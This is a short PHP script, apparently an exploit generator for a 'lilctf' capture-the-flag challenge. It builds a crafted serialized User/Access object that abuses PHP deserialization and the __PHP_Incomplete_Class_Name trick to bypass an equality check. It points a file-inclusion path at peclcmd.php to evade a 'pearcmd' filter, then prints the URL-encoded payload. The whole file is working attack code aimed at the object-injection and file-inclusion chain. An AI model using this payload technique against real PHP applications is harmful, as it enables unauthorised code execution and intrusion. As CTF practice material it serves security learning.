<?php

class Access
{
    protected $prefix = '/usr/local/lib/';
    protected $suffix = '/../php/peclcmd.php';

    public function getToken()
    {
        if (!is_string($this->prefix) || !is_string($this->suffix)) {
            throw new Exception("Go to HELL!");
        }
        $result = $this->prefix . 'lilctf' . $this->suffix;
        if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");
        }
        return $result;
    }
}

class User
{
    public $username;
    public $value;
    public function exec()
    {
        $ser = unserialize(serialize(unserialize($this->value)));
        if ($ser != $this->value && $ser instanceof Access) {
            // echo "including" . $ser->getToken() . "\n";
        }
    }
    public function __destruct()
    {
        if ($this->username == "admin") {
            $this->exec();
        }
    }
}


$user = new User();
$token = new Access();
$user->username = 'admin';
$ser = serialize($token);
$ser = str_replace('Access":2', 'LilRan":3', $ser);
$ser = substr($ser, 0, -1);
$ser .= 's:27:"__PHP_Incomplete_Class_Name";s:6:"Access";}';
$user->value = $ser;
$userser = serialize($user);
$fin = substr($userser, 0, -1);
echo urlencode($fin) . "\n";
